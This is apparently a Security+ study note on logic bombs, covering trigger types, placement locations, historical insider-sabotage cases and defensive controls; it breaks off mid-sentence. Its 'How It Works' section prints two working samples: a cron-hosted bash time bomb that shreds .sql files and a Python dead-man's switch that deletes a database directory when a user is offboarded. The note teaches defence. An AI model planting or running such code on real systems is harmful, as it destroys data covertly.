```markdown
---
domain: "malware"
tags: [malware, insider-threat, logic-bomb, sy0-701, attack, sabotage]
---
# Logic Bombs

A **logic bomb** is malicious code deliberately inserted into a legitimate program or system that remains dormant until a predefined **trigger condition** is met, at which point it executes a harmful **payload**. Unlike a [[Virus]] or [[Worm]], a logic bomb does not self-replicate; it is a staged act of sabotage, most often planted by an [[Insider Threat]] such as a disgruntled employee or contractor with legitimate access. When the trigger is specifically a date or time, the construct is also called a **time bomb**.

---
## Overview

Logic bombs occupy a distinctive niche in the malware taxonomy because they are defined by *behavior over time* rather than by propagation or self-contained payload delivery. The malicious routine is embedded alongside or inside trusted code — a payroll application, a backup script, a domain controller logon script, or a build pipeline — and waits passively. This passive dormancy is precisely what makes them difficult to detect: until the trigger fires, the host program behaves normally, signatures are not distinctive, and network indicators are absent. Many logic bombs are only discovered after they detonate, during forensic review of the damage.

Historically, logic bombs are closely associated with sabotage by privileged users. The archetype is the **Tim Lloyd / Omega Engineering** incident (1996), in which a fired network administrator's previously planted code wiped the company's manufacturing servers twenty days after his termination, causing an estimated **$10 million** in damages and the loss of 80 jobs; Lloyd received 41 months in federal prison under the Computer Fraud and Abuse Act ([[CFAA]]). Similar cases include **Roger Duronio's** 2002 attack on UBS PaineWebber — a logic bomb inside a Unix logon script that took down approximately 2,000 servers and cost roughly $3.1 million to remediate — and **Yung-Hsun Lin's** 2003 bomb at Medco Health Solutions, scheduled to wipe 70 servers containing clinical data on his own birthday. More recently, contractor **David Tinley's** Siemens spreadsheets (2014–2016) contained deliberately faulty macro logic so that only he could "fix" them, ensuring recurring billable hours.

Logic bombs are not always standalone; they are frequently a *component* of a larger attack. [[Rootkit]]s and [[Advanced Persistent Threat|APT]] implants often contain conditional logic that suppresses activity unless the host is the intended target — a sandbox-evasion check, a domain-membership check, or a geolocation check can all be classified as logic-bomb triggers. The [[Stuxnet]] worm's payload is a canonical example: it remained inert unless it detected Siemens S7-300 PLCs driving specific centrifuge frequencies associated with the Natanz enrichment facility, making the attack extraordinarily precise while appearing inert in any analyst sandbox.

Motivations range from **revenge** and **extortion** (the classic fired-admin scenario) to **fraud** (Tinley-style job-security schemes), **nation-state espionage and sabotage** (targeted conditional payloads), and **hacktivism**. Legally, planting a logic bomb on U.S. systems violates 18 U.S.C. § 1030 (the CFAA) regardless of whether it detonates, because the unauthorized modification itself is actionable. For defenders and Security+ candidates, the essential insight is that **logic bombs are a control-and-process failure, not purely a technical one**: they thrive where code review, separation of duties, offboarding procedures, and change management are weak.

---
## How It Works

A logic bomb has three logical components: a **trigger** (the condition), a **payload** (the malicious action), and a **host** (the trusted process or file it rides inside). The trigger is evaluated — usually cheaply — each time the host runs, and the payload executes only when the trigger returns true.

### Trigger Types

**Temporal triggers** fire at a specific date, time, or after a countdown from installation. This is the "time bomb" subtype and is the most common in insider-sabotage cases:

```bash
#!/bin/bash
# host: /etc/cron.daily/backup-rotate
/usr/local/bin/backup-rotate.real "$@"    # legitimate behavior preserved above
# --- planted trigger ---
if [ "$(date +%Y%m%d)" -ge "20260401" ]; then
    find / -xdev -type f -name "*.sql" -exec shred -u {} \; 2>/dev/null
fi
```

**Negative / dead-man's-switch triggers** fire when the attacker's account is removed from the directory, when a specific file stops being updated, or when a periodic check-in from the attacker ceases. This is the "fire-me-and-the-servers-die" pattern most associated with termination sabotage:

```python
# host: /opt/app/healthcheck.py (runs from a systemd timer every 6 hours)
import ldap, shutil, sys

conn = ldap.initialize("ldaps://dc01.corp.local")
conn.simple_bind_s("svc-health", "REDACTED")
result = conn.search_s(
    "ou=Staff,dc=corp,dc=local",
    ldap.SCOPE_SUBTREE,
    "(sAMAccountName=rduronio)"
)
if not result:                          # user was offboarded → detonate
    shutil.rmtree("/var/lib/pgsql/data", ignore_errors=True)
sys.exit(0)
```

**Event / state triggers** fire when a specific user logs in, a file reaches a certain size, a license counter reaches zero, a particular row appears in a database, or a named process is found running. These are common in financial-fraud logic bombs that target specific transactions.

**Environmental triggers** check whether the machine is joined to a particular Active Directory domain, has a specific MAC address OUI, resolves a specific internal DNS hostname, or geolocates to a target country. APT payloads use these extensively to avoid detonation in analyst sandboxes or on non-target hosts.

**Counter / usage triggers** fire after the Nth execution, Nth login, or Nth invoice processed. Tinley's Siemens spreadsheets reportedly used counters so that failures appeared sporadic and unattributable to a single event.

### Payload Execution

Payloads are constrained only by the host process's privilege level. Common payloads include:

- **Data destruction** — `shred`, `rm -rf`, `format`, `DROP TABLE`
- **Silent data corruption** — adjusting floating-point rounding in billing logic, flipping bits in stored records, altering configuration values over long periods so damage is cumulative and invisible
- **Ransomware staging** — encrypting data as the payload, holding decryption hostage
- **Backdoor installation** — adding a cron-based reverse shell or a new privileged local account
- **Credential exfiltration** — dumping `/etc/shadow`, LSASS, or credential stores on trigger

### Placement Vectors

Skilled insiders hide bombs in locations that receive privileged execution but minimal scrutiny:

| Location | Example |
|---|---|
| cron / systemd timer | `/etc/cron.d/payroll`, `/etc/systemd/system/backup.timer` |
| Windows Scheduled Task | `C:\Windows\System32\Tasks\UpdateHelper` |
| DB triggers / stored procedures | `CREATE TRIGGER audit_log AFTER DELETE ON accounts ...` |
| CI/CD pipeline steps | Malicious `post-build` hook in Jenkinsfile or GitHub Actions YAML |
| GPO / logon scripts | SYSVOL `scripts\logon.bat` |
| Macro-enabled Office templates | VBA `Workbook_Open()` event |
| Git hooks | `.git/hooks/post-receive` on a central repository |

In the Fannie Mae case, Makwana hid his bomb several pages below an intentional block of blank lines in a legitimate production script — a deliberate social-engineering tactic to prevent a casual reviewer from scrolling far enough to see the malicious code.

---
## Key Concepts

- **Trigger**: The conditional expression that determines when the payload executes — a date, an event, an absent user account, or an environmental fact. Evaluated on every invocation of the host process. The entire attack revolves around the trigger remaining undetected until it fires.
- **Payload**: The malicious action — deletion, corruption, exfiltration, or DoS — executed once the trigger condition is satisfied. The payload inherits the full privileges of the host process, which is why planting bombs in root-owned cron jobs or SYSTEM-level scheduled tasks is so destructive.
- **Dormancy**: The defining behavioral characteristic. Because the code is inert pre-trigger, signature-based [[Antivirus]] scanners and behavioral [[EDR|Endpoint Detection and Response]] tools rarely detect it before detonation. This distinguishes logic bombs from most other malware categories.
- **Dead-Man's Switch**: A logic bomb variant whose trigger is the *absence* of the attacker — their account being disabled, a check-in failing, or a canary file going unupdated. Makes the very act of offboarding an attacker dangerous if the bomb is already in place.
- **Time Bomb**: A proper subset of logic bombs whose trigger is strictly temporal (a specific date, a Unix epoch value, or a countdown). All time bombs are logic bombs; not all logic bombs are time bombs. The SY0-701 exam treats the terms as closely related but distinct.
- **Trojan Horse Relationship**: Because malicious code rides inside a seemingly benign and trusted program, logic bombs are formally a specialized form of [[Trojan Horse]]. The host program is the vehicle; the bomb is the hidden cargo.
- **Non-Replicating Nature**: Unlike viruses and worms, logic bombs do not spread between hosts. Each instance is individually planted. This limits blast radius but narrows attribution — only someone with write access to that specific file or system could have planted it, which aids forensic investigation.
- **Insider Threat Nexus**: Planting a logic bomb typically requires legitimate write access to trusted code, scheduled tasks, or database objects. This is why the attack vector is overwhelmingly associated with current or former employees, contractors, and third-party developers, not external attackers.

---
## Exam Relevance

**SY0-701 Objective 2.4** explicitly lists "logic bomb" among the malware types students must recognize. Expect these patterns on the exam:

**Scenario identification** is the most common question format:
> *"A systems administrator was terminated on a Friday. The following Monday, production file servers began deleting records automatically. No external network intrusion was detected. Which type of attack best explains this?"*
→ **Logic bomb** (dead-man's-switch variant). Distractors are usually *worm*, *ransomware*, or *rootkit*. The key facts are: no propagation, no external breach, delayed activation tied to an insider event.

**Trigger-based distinction**: If the question emphasizes *a specific date or time*, the answer is logic bomb (time bomb). If the question emphasizes *propagation* between hosts, the answer is worm. If the question emphasizes *encryption and a ransom demand*, the answer is ransomware.

**Defensive controls pairing**: Logic bombs are the canonical justification for **[[Separation of Duties]]**, **mandatory vacation**, **job rotation**, and **peer code review** on the exam. If a question asks "which control would best prevent a disgruntled administrator from planting malicious code in production scripts?", the answer is always a process control — code review or separation of duties — not a technical tool.

**Not self-replicating**: A common gotcha. Students conflate logic bombs with worms because both can cause widespread damage. Logic bombs *do not spread*; they are statically planted.

**Time bomb ↔ logic bomb overlap**: The exam treats "time bomb" as a synonym/subset. Either term may appear in a question stem; the underlying mechanism is identical, and the trigger is the only difference.

**Supply-chain flavor**: At least one question typically involves malicious code planted by a third-party developer or contractor during a software engagement. This is the [[Supply Chain Attack]] ↔ logic bomb overlap. The placement mechanism is the same; the insider is an external contractor rather than a direct employee.

**Memorization anchor**: **L**ogic bomb = **L**ies in wait. Dormant + conditional trigger + typically insider = logic bomb.

---
## Security Implications

Logic bombs produce disproportionate damage because they combine **privileged access** with **delayed detection** and **targeted timing**. By the time a payload fires, the planter is often long gone, backup rotations may have been poisoned, and the incident response team must reconstruct events from potentially corrupted logs.

### Notable Real-World Incidents

| Year | Actor | Target | Method | Impact |
|---|---|---|---|---|
| 1996 | Tim Lloyd | Omega Engineering | Bomb in Novell NetWare logon script | ~$10M damage, 80 jobs lost; 41 months federal prison |
| 2002 | Roger Duronio | UBS PaineWebber | Unix `mrun` logon script | ~2,000 servers down during trading hours; $3.1M remediation; 97 months prison |
| 2003 | Yung-Hsun Lin | Medco Health Solutions | Script set to fire on his birthday | Targeting 70 clinical servers; misfired due to coding error, discovered in debugging |
| 2008 | Rajendrasinh Makwana | Fannie Mae | Production script, execution date 31 Jan 2009 | Would have destroyed ~4,000 servers; discovered 5 days after termination |
| 2014–2016 | David Tinley | Siemens | VBA macros in Excel spreadsheets | Job-security fraud; recurring billing; pled guilty 2019 |
| 2010 | Nation-state (Stuxnet) | Natanz enrichment | Environmental trigger on Siemens S7-300 PLCs | Destroyed ~1,000 centrifuges; CVE-2010-2568, CVE-2010-2772 among 4 zero-days used |

### Detection Challenges

1. **Weak static signatures** — the trigger is a small conditional expression in otherwise legitimate, syntactically valid code. No novel file type or obfuscation is required.
2. **No behavioral signal pre-detonation** — behavioral analytics tools have nothing anomalous to measure while the bomb sleeps.
3. **Trusted author** — commits, script edits, and task creations by legitimate insiders pass authentication and authorization controls that would block external attackers.
4. **Review fatigue** — operational scripts grow long and are rarely re-read after initial deployment. Bombs hide below the fold.
5. **Poisoned forensics** — a sophisticated attacker may make the bomb erase its own trigger code after firing, complicating post-incident attribution.

---
## Defensive Measures

No single control stops logic bombs; defense requires layered **administrative**, **technical**, and **procedural** controls.

**Two-Person Integrity (2PI) / Mandatory Code Review**
All changes to production scripts, stored procedures, scheduled tasks, and CI/CD pipelines must be reviewed and approved by a second qualified engineer before deployment. Enforce technically via Git branch protection rules requiring at least one approved review, required signed commits, and protected main/production branches in GitHub, GitLab, or Gitea.

**Separation of Duties**
The person who writes a script must not be the sole person who deploys it to production, and neither should hold unilateral root or SYSTEM access on the target host. This is both a preventive and detective control — it forces malicious edits to survive a second set of eyes.

**Job Rotation and Mandatory Vacation**
Forcing another qualified person to operate systems for a period each year increases the probability that dormant malicious code is noticed. Financial-sector regulators mandate this partly for this reason. Rotation also ensures no single person holds unique institutional knowledge that can be used as extortion leverage.

**Immediate, Complete Deprovisioning at Offboarding**
The offboarding checklist must include: disabling all directory accounts, rotating shared service-account credentials, revoking SSH keys and TLS client certificates, auditing all cron jobs and scheduled tasks owned by or referencing the departing user, and scanning files modified in the 90 days before departure. Pair with a structured exit interview that explicitly acknowledges their obligation not to have planted harmful code.

**File Integrity Monitoring (FIM)**
Deploy [[AIDE]], [[Tripwire]], Wazuh (FIM module), or osquery `file_events` to baseline and alert on unexpected modifications to `/etc/cron.*